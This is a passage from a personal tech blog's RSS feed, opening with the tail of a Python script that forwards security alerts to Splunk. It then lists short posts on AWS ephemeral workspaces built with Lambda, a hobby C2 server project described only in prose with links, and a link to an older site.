		    <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>num_of_alerts <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
		    	logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;No Alerts Found!&#34;</span>)
		    	sleep(<span style="color:#ae81ff">60</span>)
		    	<span style="color:#66d9ef">continue</span>
		    <span style="color:#66d9ef">else</span>:
		    	<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;alertId&#39;</span>] <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>alert_id:
		    		logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Last Alert Posted ID is same as oldest pulled alert...&#34;</span>)
		    		logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Continue to top of loop until this is resolved&#34;</span>)
		    		sleep(<span style="color:#ae81ff">60</span>)
		    		<span style="color:#66d9ef">continue</span>

		    	<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,self<span style="color:#f92672">.</span>num_of_alerts):
		    		<span style="color:#75715e">#print(x)</span>
		    		self<span style="color:#f92672">.</span>post_to_splunk(self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>][x])
		    		<span style="color:#66d9ef">if</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>num_of_alerts:
		    			logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;attemping to get last alerts alert id&#34;</span>)
		    			self<span style="color:#f92672">.</span>alert_id <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>][x][<span style="color:#e6db74">&#39;alertId&#39;</span>]
		    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;below is last alerts alert id&#34;</span>)
		    logging<span style="color:#f92672">.</span>info(self<span style="color:#f92672">.</span>alert_id)
		    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;done sleeping running loop again... checking for new alerts&#34;</span>)
		    sleep(<span style="color:#ae81ff">60</span>)


<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    AlertAPI()<span style="color:#f92672">.</span>main()

</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>AWS Ephemeral Workspaces</title>
            <link>https://christopherja.rocks/posts/2020/01/aws-ephemeral-workspaces/</link>
            <pubDate>Wed, 15 Jan 2020 13:05:45 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/01/aws-ephemeral-workspaces/</guid>
            <description>AWS doesnt offer ephemeral workspaces at this point in time. So i was tasked with finding a solution and seeing if this was possible. Searching online i didnt find much. But i did find a way to work through this problem. Using lambda functions, Cloud Watch , Cloud Trail &amp;amp;Workspaces of course.
In my repo i have a pdf explaining how it works (hopefully well) its basically three lambda functions. One function triggers when a new workspace is created, and creates a cloud watch rule on it to see if it disconnects or logs off.</description>
            <content type="html"><![CDATA[<p>AWS doesnt offer ephemeral workspaces at this point in time. So i was tasked with finding a solution and seeing if this was possible. Searching online i didnt find much. But i did find a way to work through this problem. Using lambda functions, Cloud Watch , Cloud Trail &amp;Workspaces of course.</p>
<p>In my repo i have a pdf explaining how it works (hopefully well) its basically three lambda functions. One function triggers when a new workspace is created, and creates a cloud watch rule on it to see if it disconnects or logs off. If it does it will trigger the rule and run the big function that tears down the workspace completely and rebuilds it from an image. And the last function watches for workspaces being terminated to delete the alert that is tied to that workspace.</p>
<p>So it pretty much is a small ecosystem of functions working upon the work of the others. Code &amp; PDF here =&gt; <a href="https://github.com/latortuga71/AWS_Ephemeral_Workspaces">Repo has PDF that explains in detail</a></p>
]]></content>
        </item>
        
        <item>
            <title>BlackTabby C2 Server</title>
            <link>https://christopherja.rocks/posts/2020/01/blacktabby-c2-server/</link>
            <pubDate>Fri, 03 Jan 2020 13:06:50 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/01/blacktabby-c2-server/</guid>
            <description>I wanted to learn more about C2 Servers, so i tried to write my own. And i was semi-successful. It works. But its not neccesarily useful for others in my opinion. I think my biggest mistake was using couch db as the database. Using sqlLite would have been better i think. I will definitely pursue this again. As it wasnt as hard as i thought and most likely will try the same formula again but with a different DB and perhaps writing the server in C (As i think it would help me get better).</description>
            <content type="html"><![CDATA[<p>I wanted to learn more about C2 Servers, so i tried to write my own. And i was semi-successful. It works. But its not neccesarily useful for others in my opinion. I think my biggest mistake was using couch db as the database. Using sqlLite would have been better i think. I will definitely pursue this again. As it wasnt as hard as i thought and most likely will try the same formula again but with a different DB and perhaps writing the server in C (As i think it would help me get better). Writing an agent in powershell and C# also helped me get into those languages a little more as well. <a href="https://github.com/latortuga71/Black_Tabby">repo</a></p>
<p><a href="https://asciinema.org/a/Cd53d45U1azyUZvlcbGdnOxDv"><img src="https://asciinema.org/a/Cd53d45U1azyUZvlcbGdnOxDv.svg" alt="asciicast"></a></p>
]]></content>
        </item>
        
        <item>
            <title>Old Posts Found Here</title>
            <link>https://christopherja.rocks/posts/2020/01/old-posts-found-here/</link>
            <pubDate>Wed, 01 Jan 2020 08:53:31 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/01/old-posts-found-here/</guid>
            <description>Check out my OldSite that contains all my old posts.</description>
            <content type="html"><![CDATA[<p>Check out my <a href="http://chrisja.info">OldSite</a> that contains all my old posts.</p>
]]></content>
        </item>
        
    </channel>
</rss>
